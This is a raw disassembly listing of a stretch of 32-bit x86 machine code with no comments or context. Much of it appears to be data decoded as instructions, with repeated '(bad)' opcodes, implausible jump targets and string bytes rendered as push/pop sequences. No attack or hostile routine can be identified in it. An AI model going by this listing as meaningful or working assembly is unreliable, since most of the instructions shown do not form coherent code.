  4341ce:	add    BYTE PTR [eax+0x4d],dl
  4341d1:	jne    0x434206
  4341d3:	lea    ecx,[ebx-0x7617fc44]
  4341d9:	div    ah
  4341db:	inc    DWORD PTR [ebp+0x45]
  4341de:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4341e4:	jb     0x434171
  4341e6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4341ed:	mov    ecx,DWORD PTR [ebp-0x10]
  4341f0:	xor    ecx,DWORD PTR [ebp+0x3]
  4341f3:	mov    edi,DWORD PTR [ebx]
  4341f5:	adc    BYTE PTR [ebp+0x41],dh
  4341f8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4341fe:	ret    
  4341ff:	push   ss
  434200:	push   0x45
  434202:	lea    ecx,[ebx+0x4de80cb0]
  434208:	sti    
  434209:	add    edi,edi
  43420b:	or     BYTE PTR [ebp+0x4d],al
  43420e:	mov    ebp,DWORD PTR [ebx]
  434210:	xor    ebp,ecx
  434212:	mov    al,BYTE PTR [edx]
  434214:	add    eax,0xc7200
  434219:	jne    0x434268
  43421b:	lea    esi,[ebx]
  43421d:	mov    al,0xf
  43421f:	call   0xf38e4
  434224:	shl    DWORD PTR [esi],0x84
  434227:	pushf  
  434228:	add    DWORD PTR [ecx+0x4545d000],ecx
  43422e:	mov    edi,DWORD PTR [ecx]
  434230:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  434237:	test   DWORD PTR [eax],eax
  434239:	clc    
  43423a:	dec    ebp
  43423b:	inc    ebp
  43423c:	xor    edi,DWORD PTR [ebx]
  43423e:	setl   al
  434241:	(bad)  
  434242:	retf   
  434243:	rol    cl,1
  434245:	dec    ebp
  434246:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43424c:	inc    ebp
  43424d:	lea    ecx,[ebx-0x75b2cc38]
  434253:	lea    eax,ds:0x4d72c4
  434259:	mov    ecx,DWORD PTR [ebp-0x4]
  43425c:	xor    ecx,edi
  43425e:	bswap  ebx
  434260:	ror    BYTE PTR [ebp-0x35],0xe9
  434264:	rol    DWORD PTR [ecx],0x84
  434267:	add    BYTE PTR [ecx],al
  434269:	cmp    BYTE PTR [eax],al
  43426b:	pushf  
  43426c:	inc    ebp
  43426d:	jnp    0x8a437670
  434273:	mov    eax,DWORD PTR ds:0xcf72e8
  434279:	lock dec ebp
  43427b:	retf   
  43427c:	xor    ecx,DWORD PTR [ebp+0xf]
  43427f:	mov    eax,eax
  434281:	fmul   st,st(3)
  434283:	test   ecx,0x1998484
  434289:	xor    al,BYTE PTR [eax]
  43428b:	mov    DWORD PTR [ebp-0x28],eax
  43428e:	mov    eax,DWORD PTR [ebp+0x33]
  434291:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434297:	ret    
  434298:	add    al,cl
  43429a:	dec    ebp
  43429b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4342a1:	add    ecx,DWORD PTR ds:0xc7250
  4342a7:	inc    ebp
  4342a8:	rcl    DWORD PTR [eax+0x4d],0x2b
  4342ac:	mov    edi,edi
  4342ae:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4342b4:	jb     0x43427d
  4342b6:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4342bd:	mov    esi,DWORD PTR [ebx]
  4342bf:	cld    
  4342c0:	mov    cl,bh
  4342c2:	or     eax,0x372b6
  4342c7:	cmp    ecx,eax
  4342c9:	jne    0x434346
  4342cf:	mov    eax,DWORD PTR [ebp-0x20]
  4342d2:	mov    eax,DWORD PTR [eax]
  4342d4:	xor    eax,edi
  4342d6:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4342dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4342e0:	mov    ecx,edi
  4342e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4342e8:	jb     0x4342f9
  4342ea:	add    BYTE PTR [edi-0x3f],dl
  4342ed:	add    BYTE PTR [ebp-0x75],cl
  4342f0:	mov    esi,eax
  4342f2:	xor    eax,DWORD PTR [eax]
  4342f4:	mov    al,bh
  4342f6:	or     eax,0x497284
  4342fb:	xor    al,cl
  4342fd:	mov    ecx,DWORD PTR [ebp-0x4]
  434300:	mov    ecx,edi
  434302:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434308:	jb     0x434319
  43430a:	add    BYTE PTR [edi],dh
  43430c:	enter  0x8500,0x8b
  434310:	add    ah,bl
  434312:	add    BYTE PTR [eax],al
  434314:	inc    ebp
  434315:	(bad)  
  434316:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43431d:	mov    esi,DWORD PTR [edx-0x4]
  434320:	add    bh,cl
  434322:	dec    ebp
  434323:	mov    dh,0x8b
  434325:	add    esi,DWORD PTR [ebx]
  434327:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43432d:	add    BYTE PTR [eax],al
  43432f:	mov    eax,ecx
  434331:	loopne 0x434380
  434333:	add    BYTE PTR [ebx-0x757bcc39],cl
  434339:	dec    ecx
  43433a:	or     eax,0x8b7232
  43433f:	in     al,0xc1
  434341:	or     DWORD PTR [ebp-0x31],ecx
  434344:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  43434b:	xor    dh,BYTE PTR [edx-0x75]
  43434e:	add    al,dh
  434350:	enter  0x4f09,0xcf
  434354:	inc    ebp
  434355:	mov    WORD PTR [ebx-0x75cdccb7],cs
  43435b:	or     al,BYTE PTR ds:0xe4728b
  434361:	or     DWORD PTR [ebp-0x31],ecx
  434364:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  43436b:	cmp    dh,BYTE PTR [edx+0xf]
  43436e:	add    bl,dl
  434370:	rol    DWORD PTR [eax],0x4d
  434373:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  434379:	(bad)  
  43437a:	or     eax,0x497284
  43437f:	xor    al,cl
  434381:	mov    ecx,DWORD PTR [ebp-0x20]
  434384:	mov    ecx,DWORD PTR [ecx]
  434386:	xor    ecx,edi
  434388:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43438f:	xor    cl,al
  434391:	mov    ecx,DWORD PTR [edi]
  434393:	fadd   QWORD PTR [ebp+0x9]
  434396:	call   0xffd03e6a
  43439b:	dec    ecx
  43439c:	dec    ebp
  43439d:	xor    bh,BYTE PTR [ebx]
  43439f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4343a3:	loopne 0x4343a1
  4343a5:	or     edi,eax
  4343a7:	iret   
  4343a8:	ret    
  4343a9:	mov    WORD PTR [ebp+0x4d],es
  4343ac:	mov    esi,DWORD PTR [edx]
  4343ae:	call   0x84530aed
  4343b3:	(bad)  
  4343b4:	cdq    
  4343b5:	add    BYTE PTR [edx],dh
  4343b7:	mov    esi,DWORD PTR [ebx]
  4343b9:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4343bf:	test   BYTE PTR [ebx],dh
  4343c1:	dec    ecx
  4343c2:	add    esi,DWORD PTR [edx]
  4343c4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4343ca:	dec    edi
  4343cc:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  4343d3:	xor    al,BYTE PTR [ebx]
  4343d5:	mov    edi,DWORD PTR [ebx]
  4343d7:	in     al,0x75
  4343d9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4343df:	dec    ecx
  4343e0:	xor    esi,DWORD PTR [edx]
  4343e2:	lea    ecx,[edx]
  4343e4:	or     BYTE PTR [ebx+0x900f072],cl
  4343ea:	ja     0x4343bb
  4343ec:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  4343f3:	cmp    ch,al
  4343f5:	jne    0x4343ea
  4343f7:	mov    edi,edi
  4343f9:	fadd   QWORD PTR [ebp+0x0]
  4343fc:	mov    eax,edi
  4343fe:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434405:	mov    edx,DWORD PTR [ebx]
  434407:	in     al,0x45
  434409:	or     DWORD PTR [ebx],esi
  43440b:	iret   
  43440c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434413:	xor    dl,BYTE PTR [eax-0x75]
  434416:	sbb    al,0xe0
  434418:	dec    DWORD PTR [ecx]
  43441a:	mov    ecx,edi
  43441c:	in     al,dx
  43441d:	mov    eax,es
  43441f:	dec    ecx
  434420:	mov    DWORD PTR [edx],esi
  434422:	fmul   QWORD PTR [edx]
  434424:	jne    0x4343b1
  434426:	(bad)  
  434427:	(bad)  
  434429:	or     DWORD PTR [ebp-0x31],eax
  43442c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  434433:	cmp    bh,bh
  434435:	jne    0x43447c
  434437:	lea    ecx,[ebx-0x38372750]
  43443d:	inc    ebx
  43443f:	mov    eax,ecx
  434441:	mov    eax,0xa00c111
  434446:	jne    0x43448d
  434448:	mov    esi,DWORD PTR [ebx]
  43444a:	test   al,0x3
  43444c:	inc    ebp
  43444d:	mov    DWORD PTR [eax-0xc],edx
  434450:	loop   0x434497
  434452:	push   DWORD PTR [ebx]
  434454:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43445a:	add    DWORD PTR [eax],eax
  43445c:	mov    eax,edi
  43445e:	lods   al,BYTE PTR ds:[esi]
  43445f:	dec    ebp
  434460:	inc    ebp
  434461:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  434467:	retf   
  434468:	mov    edx,ecx
  43446a:	adc    al,0x84
  43446c:	(bad)  
  43446d:	std    
  43446e:	ret    
  43446f:	jmp    FWORD PTR [edi-0x2b7474bb]
  434475:	hlt    
  434476:	rol    edi,0x82
  434479:	ret    
  43447a:	cld    
  43447b:	enter  0x11ff,0x45
  43447f:	inc    ebp
  434480:	pop    edi
  434481:	mov    ebx,DWORD PTR [ebx+0x14]
  434484:	ret    0xc7
  434487:	test   BYTE PTR [ebx+0x45325199],cl
  43448d:	jmp    0x43441a
  43448f:	push   0x8
  434491:	call   DWORD PTR [esi]
  434493:	in     al,dx
  434494:	add    BYTE PTR [ebp+0x1],0x50
  434498:	add    bh,ah
  43449a:	add    bh,bh
  43449c:	icebp  
  43449d:	mov    ecx,DWORD PTR [eax]
  43449f:	cld    
  4344a0:	pop    es
  4344a1:	dec    ebp
  4344a2:	shl    DWORD PTR [ebx],0x72
  4344a5:	add    eax,DWORD PTR [eax]
  4344a7:	cmp    edx,ecx
  4344a9:	je     0x4344bb
  4344ab:	mov    esi,DWORD PTR [ebp-0x4]
  4344ae:	inc    edi
  4344b0:	or     al,0xc3
  4344b2:	jmp    FWORD PTR [edx-0x18]
  4344b5:	(bad)  
  4344b6:	sti    
  4344b7:	cwde   
  4344b8:	(bad)  
  4344b9:	call   0xffa13dc4
  4344be:	or     al,0x45
  4344c0:	push   ebp
  4344c1:	sub    esp,0x18
  4344c4:	push   ebx
  4344c5:	inc    ebp
  4344c6:	mov    edi,edi
  4344c8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4344cf:	test   al,0x51
  4344d1:	inc    ebp
  4344d2:	push   ecx
  4344d3:	push   eax
  4344d4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4344da:	add    ah,bh
  4344dc:	(bad)  
  4344dd:	dec    ebp
  4344de:	add    DWORD PTR [ebx],esi
  4344e0:	inc    ebp
  4344e1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4344e7:	push   0xffffff8b
  4344e9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4344ef:	add    eax,DWORD PTR [ecx]
  4344f1:	or     BYTE PTR [eax],al
  4344f3:	call   0xff853cf8
  4344f8:	mov    eax,DWORD PTR [ebp+0x14]
  4344fb:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434501:	inc    ebp
  434502:	dec    ecx
  434503:	add    ebp,DWORD PTR [edx+0x14]
  434506:	push   0x8b3045
  43450b:	call   0x33ad9280
  434510:	inc    DWORD PTR [ebx]
  434512:	mov    DWORD PTR [edi],ecx
  434514:	mov    eax,ecx
  434516:	or     BYTE PTR [ebp-0x3d],cl
  434519:	cmp    eax,edi
  43451b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  434520:	adc    BYTE PTR [ebx+0x5eff0845],cl
  434526:	adc    al,0xc9
  434528:	inc    ebp
  434529:	adc    BYTE PTR [eax+0x55],dl
  43452c:	jne    0x43451a
  43452e:	call   0xff5444be
  434533:	dec    ebp
  434534:	inc    ebp
  434535:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43453b:	add    BYTE PTR [ebx],bh
  43453d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  434541:	push   ecx
  434542:	or     al,0x51
  434544:	dec    ebp
  434545:	xor    DWORD PTR [ebx],0xf320399
  43454b:	cmp    eax,DWORD PTR [ebp+0x74]
  43454e:	mov    edi,edi
  434550:	pop    edi
  434551:	adc    BYTE PTR [ebx+0x75],bl
  434554:	ret    0x50
  434557:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43455b:	(bad)  
  43455c:	clc    
  43455d:	mov    esp,ebp
  43455f:	pop    ecx
  434560:	mov    ecx,0xf80085c2
  434565:	mov    ecx,DWORD PTR [ecx+edx*2]
  434568:	push   esi
  434569:	push   esi
  43456a:	(bad)  
  43456b:	lock add eax,DWORD PTR [ebp+0x44]
  43456f:	mov    edx,DWORD PTR [eax]
  434571:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  434575:	or     BYTE PTR [ecx+0x7],dl
  434578:	push   ecx
  434579:	ret    
  43457a:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434580:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434586:	or     al,0x80
  434588:	jge    0x43458b
  43458a:	mov    DWORD PTR [eax],eax
  43458c:	and    al,0x8
  43458e:	cmp    DWORD PTR [ebp+0x10],eax
  434591:	mov    edx,DWORD PTR [esi]
  434593:	xchg   esp,eax
  434594:	dec    esp
  434595:	add    BYTE PTR [eax],dl
  434597:	mov    ecx,edx
  434599:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43459d:	dec    ebp
  43459e:	into   
  43459f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4345a5:	mov    edx,DWORD PTR [eax+0x14]
  4345a8:	das    
  4345a9:	add    al,0x45
  4345ab:	add    BYTE PTR [ebp+0x0],dh
  4345ae:	mov    edi,edi
  4345b0:	and    al,0x50
  4345b2:	mov    eax,DWORD PTR [eax]
  4345b4:	and    al,0xd1
  4345b6:	xor    eax,DWORD PTR [esi]
  4345b8:	lea    eax,[ebp+0x8]
  4345bb:	xor    esi,DWORD PTR [edx+0x3]
  4345be:	add    BYTE PTR [ecx+0x4510fc44],cl
  4345c4:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  4345ca:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4345d4:	cmp    edi,edi
  4345d6:	pushf  
  4345d7:	mov    edi,edi
  4345d9:	or     BYTE PTR [esi+ecx*1],cl
  4345dc:	jne    0x4345a1
  4345de:	call   0xc45aa
  4345e3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4345e7:	mov    ebx,DWORD PTR [eax]
  4345e9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4345ed:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4345f5:	pop    esi
  4345f6:	(bad)  
  4345f7:	leave  
  4345f8:	call   DWORD PTR [eax]
  4345fa:	call   DWORD PTR [ebp+0x24]
  4345fd:	in     al,dx
  4345fe:	jmp    esp
  434600:	and    al,0x83
  434602:	call   0xff7a4417
  434607:	pushf  
  434608:	inc    esp
  434609:	mov    DWORD PTR [esp],ecx
  43460c:	pop    esi
  43460d:	push   edi
  43460e:	in     eax,0x41
  434610:	ret    0x89
  434613:	and    al,0xe
  434615:	mov    edi,DWORD PTR [eax]
  434617:	and    al,0x75
  434619:	mov    edx,0x7750885
  43461e:	or     dl,bh
  434620:	call   FWORD PTR [ecx+0x3243224]
  434626:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  43462c:	dec    DWORD PTR [esp]
  43462f:	jl     0x4345bc
  434631:	adc    al,0xc
  434633:	dec    ebp
  434634:	cmp    DWORD PTR [ebp+0x1c],esi
  434637:	mov    ecx,DWORD PTR [eax]
  434639:	and    al,0x10
  43463b:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  434642:	test   DWORD PTR [edi],ecx
  434644:	jge    0x434610
  434646:	push   0x8908ff4c
  43464b:	jmp    0x434671
  43464d:	adc    BYTE PTR [esp+eax*2-0x75],dh
  434651:	dec    esp
  434652:	pop    ebp
  434653:	ret    0x8999
  434656:	push   0x74f89cf8
  43465b:	jmp    0x4346d1
  43465d:	mov    edi,0x104fd55f
  434662:	add    BYTE PTR [eax],dh
  434664:	adc    BYTE PTR ds:[eax],al
  434667:	or     edx,DWORD PTR gs:[eax]
  43466a:	add    BYTE PTR [ecx],ch
  43466c:	add    eax,0x35270010
  434671:	adc    BYTE PTR [eax],al
  434673:	std    
  434674:	dec    eax
  434675:	adc    BYTE PTR [eax],al
  434677:	(bad)  
  434678:	outs   dx,BYTE PTR ds:[esi]
  434679:	adc    BYTE PTR [eax],al
  43467b:	sahf   
  43467c:	xor    DWORD PTR [eax],edx
  43467e:	add    BYTE PTR [esi+0x0],al
  434681:	adc    BYTE PTR [eax],al
  434683:	fs jae 0x434696
  434686:	add    BYTE PTR [ebx+0x5f001054],bh
  43468c:	inc    esi
  43468d:	inc    ebx
  43468e:	add    BYTE PTR [ebx+0x46],ah
  434691:	inc    ebx
  434692:	add    BYTE PTR [edi+0x46],ah
  434695:	inc    ebx
  434696:	add    BYTE PTR [ebx+0x46],ch
  434699:	inc    ebx
  43469a:	add    BYTE PTR [edi+0x46],ch
  43469d:	inc    ebx
  43469e:	add    BYTE PTR [ebx+0x46],dh
  4346a1:	inc    ebx
  4346a2:	add    BYTE PTR [edi+0x46],dh
  4346a5:	inc    ebx
  4346a6:	add    BYTE PTR [ebx+0x46],bh
  4346a9:	inc    ebx
  4346aa:	add    BYTE PTR [edi+0x46],bh
  4346ad:	inc    ebx
  4346ae:	add    BYTE PTR [ebx-0x78ffbcba],al
  4346b4:	inc    esi
  4346b5:	inc    ebx
  4346b6:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  4346bd:	adc    BYTE PTR [eax],al
  4346bf:	adc    dh,BYTE PTR [ecx+0x10]
  4346c2:	add    BYTE PTR [edi+0x2c001065],al
  4346c8:	push   0x5aa20010
  4346cd:	adc    BYTE PTR [eax],al
  4346cf:	rol    DWORD PTR [eax+edx*1],0x0
  4346d3:	int    0x6f
  4346d5:	adc    BYTE PTR [eax],al
  4346d7:	mov    bh,0x46
  4346d9:	inc    ebx
  4346da:	add    BYTE PTR [ebx-0x40ffbcba],bh
  4346e0:	inc    esi
  4346e1:	inc    ebx
  4346e2:	add    bl,al
  4346e4:	inc    esi
  4346e5:	inc    ebx
  4346e6:	add    bh,al
  4346e8:	inc    esi
  4346e9:	inc    ebx
  4346ea:	add    bl,cl
  4346ec:	inc    esi
  4346ed:	inc    ebx
  4346ee:	add    bh,cl
  4346f0:	inc    esi
  4346f1:	inc    ebx
  4346f2:	add    bl,dl
  4346f4:	inc    esi
  4346f5:	inc    ebx
  4346f6:	add    BYTE PTR [ebx+0x54001005],dh
  4346fc:	push   ebp
  4346fd:	adc    BYTE PTR [eax],al
  4346ff:	sbb    bh,BYTE PTR [eax]
  434701:	adc    BYTE PTR [eax],al
  434703:	mov    edx,0x2f001013
  434708:	dec    edx
  434709:	adc    BYTE PTR [eax],al
  43470b:	inc    ecx
  43470c:	or     edx,DWORD PTR [eax]
  43470e:	add    BYTE PTR [ebx+0x19],ch
  434711:	adc    BYTE PTR [eax],al
  434713:	mov    esp,0xf700103e
  434718:	inc    esi
  434719:	inc    ebx
  43471a:	add    bl,bh
  43471c:	inc    esi
  43471d:	inc    ebx
  43471e:	add    bh,bh
  434720:	inc    esi
  434721:	inc    ebx
  434722:	add    BYTE PTR [ebx],al
  434724:	inc    edi
  434725:	inc    ebx
  434726:	add    BYTE PTR [edi],al
  434728:	inc    edi
  434729:	inc    ebx
  43472a:	add    BYTE PTR [ebx],cl
  43472c:	inc    edi
  43472d:	inc    ebx
  43472e:	add    BYTE PTR [edi],cl
  434730:	inc    edi
  434731:	inc    ebx
  434732:	add    BYTE PTR [ebx],dl
  434734:	inc    edi
  434735:	inc    ebx
  434736:	add    BYTE PTR [edi-0x27ffef96],ch
  43473c:	imul   edx,DWORD PTR [eax],0x0
  43473f:	sahf   
  434740:	push   ss
  434741:	adc    BYTE PTR [eax],al
  434743:	jle    0x43477f
  434745:	adc    BYTE PTR [eax],al
  434747:	jbe    0x43475e
  434749:	adc    BYTE PTR [eax],al
  43474b:	cmp    DWORD PTR [edi+0x10],edx
  43474e:	add    BYTE PTR [ebp+0x59001066],bl
  434754:	adc    al,0x10
  434756:	add    BYTE PTR [edi],dh
  434758:	inc    edi
  434759:	inc    ebx
  43475a:	add    BYTE PTR [ebx],bh
  43475c:	inc    edi
  43475d:	inc    ebx
  43475e:	add    BYTE PTR [edi],bh
  434760:	inc    edi
  434761:	inc    ebx
  434762:	add    BYTE PTR [ebx+0x47],al
  434765:	inc    ebx
  434766:	add    BYTE PTR [edi+0x47],al
  434769:	inc    ebx
  43476a:	add    BYTE PTR [ebx+0x47],cl
  43476d:	inc    ebx
  43476e:	add    BYTE PTR [edi+0x47],cl
  434771:	inc    ebx
  434772:	add    BYTE PTR [ebx+0x47],dl
  434775:	inc    ebx
  434776:	add    BYTE PTR [ebx-0x6affef90],bh
  43477c:	inc    ebp
  43477d:	adc    BYTE PTR [eax],al
  43477f:	dec    ebx
  434780:	dec    eax
  434781:	adc    BYTE PTR [eax],al
  434783:	dec    ebx
  434784:	popa   
  434785:	adc    BYTE PTR [eax],al
  434787:	adc    al,BYTE PTR [eax+edx*1]
  43478a:	add    dh,dl
  43478c:	push   ds
  43478d:	adc    BYTE PTR [eax],al
  43478f:	hlt    
  434790:	pop    ds
  434791:	adc    BYTE PTR [eax],al
  434793:	dec    ecx
  434794:	pop    eax
  434795:	adc    BYTE PTR [eax],al
  434797:	ja     0x4347e0
  434799:	inc    ebx
  43479a:	add    BYTE PTR [ebx+0x47],bh
  43479d:	inc    ebx
  43479e:	add    BYTE PTR [edi+0x47],bh
  4347a1:	inc    ebx
  4347a2:	add    BYTE PTR [ebx-0x78ffbcb9],al
  4347a8:	inc    edi
  4347a9:	inc    ebx
  4347aa:	add    BYTE PTR [ebx-0x70ffbcb9],cl
  4347b0:	inc    edi
  4347b1:	inc    ebx
  4347b2:	add    BYTE PTR [ebx+0x4d004347],dl
  4347b8:	push   edi
  4347b9:	xor    DWORD PTR [ecx],esi
  4347bb:	cmp    BYTE PTR [edi+ebx*2],dh
  4347be:	push   ecx
  4347bf:	add    BYTE PTR [edx+0x33],dl
  4347c2:	push   esi
  4347c3:	xor    eax,0x3849515f
  4347c8:	xor    al,0x59
  4347ca:	push   edi
  4347cb:	add    BYTE PTR [ebx+0x54],al
  4347ce:	inc    ebp
  4347cf:	pop    edi
  4347d0:	dec    ebx
  4347d1:	push   edx
  4347d2:	push   ebp
  4347d3:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  4347d8:	pop    edi
  4347d9:	aaa    
  4347da:	xor    al,0x32
  4347dc:	xor    BYTE PTR [edi+0x5f],al
  4347df:	inc    ebx
  4347e0:	pop    edx
  4347e1:	add    BYTE PTR [edi+0x4e],al
  4347e4:	cmp    DWORD PTR [edi+0x47],ebx
  4347e7:	push   ebx
  4347e8:	cmp    DWORD PTR [edi+0x4e],edx
  4347eb:	add    BYTE PTR [ecx+0x44],dl
  4347ee:	cmp    BYTE PTR [edi+0x33],bl
  4347f1:	cmp    BYTE PTR [eax],dh
  4347f3:	pop    edi
  4347f4:	inc    ecx
  4347f5:	dec    edi
  4347f6:	inc    esi
  4347f7:	push   eax
  4347f8:	add    BYTE PTR [edx+0x43],dl
  4347fb:	xor    eax,0x41305f30
  434800:	xor    BYTE PTR [esi+0x5f],al
  434803:	inc    ebx
  434804:	xor    dh,BYTE PTR [edx]
  434806:	xor    eax,0x36545200
  43480b:	xor    al,0x5f
  43480d:	dec    esi
  43480e:	xor    esi,DWORD PTR [edx]
  434810:	add    BYTE PTR ss:[eax+0x4b],cl
  434814:	inc    ebx
  434815:	pop    edi
  434816:	ss xor al,0x34
  434819:	pop    edi
  43481a:	inc    ecx
  43481b:	push   esp
  43481c:	dec    edi
  43481d:	add    BYTE PTR [esi+0x52],dl
  434820:	push   esi
  434821:	pop    edi
  434822:	inc    esi
  434823:	push   ecx
  434824:	push   ebp
  434825:	push   edx
  434826:	dec    eax
  434827:	add    BYTE PTR [esi+0x41],cl
  43482a:	inc    edx
  43482b:	pop    edi
  43482c:	xor    DWORD PTR [ecx],edi
  43482e:	push   edi
  43482f:	pop    edi
  434830:	pop    edx
  434831:	xor    eax,0x47003934
  434836:	push   edx
  434837:	push   ebp
  434838:	pop    edi
  434839:	xor    al,BYTE PTR [edx+0x30]
  43483c:	push   ebx
  43483d:	dec    esi
  43483e:	xor    eax,0x38564300
  434843:	xor    al,0x5f
  434845:	xor    bl,BYTE PTR [eax+0x36]
  434848:	inc    edx
  434849:	pop    edi
  43484a:	pop    ecx
  43484b:	xor    al,BYTE PTR [ecx+0x0]
  43484e:	push   edi
  43484f:	dec    ecx
  434850:	push   ebx
  434851:	xor    DWORD PTR [eax],edi
  434853:	pop    edi
  434854:	push   ecx
  434855:	xor    BYTE PTR [edx+0x5f],cl
  434858:	inc    ecx
  434859:	add    BYTE PTR ss:[edx+0x45],al
  43485d:	push   edi
  43485e:	cmp    DWORD PTR [eax],edi
  434860:	pop    edi
  434861:	inc    edx
  434862:	xor    eax,0x36520057
  434867:	aaa    
  434868:	xor    BYTE PTR [edi],dh
  43486a:	pop    edi
  43486b:	inc    edx
  43486c:	cmp    DWORD PTR [edi+0x52],eax
  43486f:	dec    esp
  434870:	pop    edi
  434871:	dec    ebx
  434872:	add    BYTE PTR [esp+edx*2+0x30],al
  434876:	pop    edi
  434877:	push   ebp
  434878:	push   ebx
  434879:	aaa    
  43487a:	dec    ebp
  43487b:	pop    edi
  43487c:	xor    ecx,DWORD PTR [edx+0x4e]
  43487f:	dec    ebx
  434880:	dec    edx
  434881:	add    BYTE PTR [edi+0x47],al
  434884:	xor    eax,0x534e5f32
  434889:	push   esp
  43488a:	pop    edi
  43488b:	push   esp
  43488c:	inc    edx
  43488d:	inc    esi
  43488e:	inc    esp
  43488f:	add    BYTE PTR [ebp+0x4e],al
  434892:	inc    edi
  434893:	cmp    DWORD PTR [edi+0x57],ebx
  434896:	push   eax
  434897:	push   ecx
  434898:	pop    edi
  434899:	dec    edi
  43489a:	inc    ebx
  43489b:	push   edi
  43489c:	pop    edi
  43489d:	inc    edi
  43489e:	add    BYTE PTR [edi+0x45],dl
  4348a1:	inc    esi
  4348a2:	pop    edi
  4348a3:	push   edx
  4348a4:	inc    edx
  4348a5:	pop    eax
  4348a6:	inc    edi
  4348a7:	ss pop edi
  4348a9:	push   esi
  4348aa:	inc    ebx
  4348ab:	dec    esi
  4348ac:	inc    esp
  4348ad:	add    BYTE PTR [edi+0x4d],cl
  4348b0:	inc    edi
  4348b1:	xor    ebx,DWORD PTR [edi+0x34]
  4348b4:	dec    esi
  4348b5:	pop    edx
  4348b6:	cmp    BYTE PTR [edi+0x58],bl
  4348b9:	cmp    BYTE PTR [eax],al
  4348bb:	push   edx
  4348bc:	pop    eax
  4348bd:	push   ecx
  4348be:	pop    edi
  4348bf:	dec    esp
  4348c0:	push   edx
  4348c1:	dec    ecx
  4348c2:	dec    edi
  4348c3:	inc    esp
  4348c4:	pop    edi
  4348c5:	dec    edi
  4348c6:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  4348ca:	push   eax
  4348cb:	inc    ebp
  4348cc:	pop    edi
  4348cd:	xor    eax,0x565f3945
  4348d2:	add    BYTE PTR [edi+0x4e],al
  4348d5:	push   esi
  4348d6:	pop    edi
  4348d7:	inc    edi
  4348d8:	push   esp
  4348d9:	dec    eax
  4348da:	xor    dh,BYTE PTR [ecx]
  4348dc:	pop    edi
  4348dd:	dec    edi
  4348de:	xor    eax,DWORD PTR ss:[eax]
  4348e1:	inc    esp
  4348e2:	inc    ebp
  4348e3:	dec    ecx
  4348e4:	pop    edi
  4348e5:	push   edx
  4348e6:	dec    eax
  4348e7:	xor    al,0x48
  4348e9:	dec    ecx
  4348ea:	ss pop edi
  4348ec:	aaa    
  4348ed:	aaa    
  4348ee:	dec    ecx
  4348ef:	dec    ebp
  4348f0:	add    BYTE PTR [eax+0x54],cl
  4348f3:	ss pop edi
  4348f5:	inc    esi
  4348f6:	inc    edx
  4348f7:	xor    dh,BYTE PTR [eax+eax*1]
  4348fa:	dec    esi
  4348fb:	ss dec edx
  4348fd:	pop    edi
  4348fe:	dec    ecx
  4348ff:	dec    esp
  434900:	inc    edi
  434901:	inc    esp
  434902:	dec    eax
  434903:	xor    BYTE PTR [eax],bh
  434905:	xor    eax,0x34004f00
  43490a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43490e:	add    BYTE PTR [edi],dh
  434910:	add    BYTE PTR [eax],dh
  434912:	add    BYTE PTR [edi+0x0],bl
  434915:	inc    esp
  434916:	add    BYTE PTR [edi+0x0],al
  434919:	dec    ebx
  43491a:	add    BYTE PTR [edx],dh
  43491c:	add    BYTE PTR [ecx+0x0],al
  43491f:	inc    ebx
  434920:	add    BYTE PTR [eax],al
  434922:	add    BYTE PTR [edi+0x0],cl
  434925:	xor    al,BYTE PTR [eax]
  434927:	xor    eax,DWORD PTR [eax]
  434929:	pop    edi
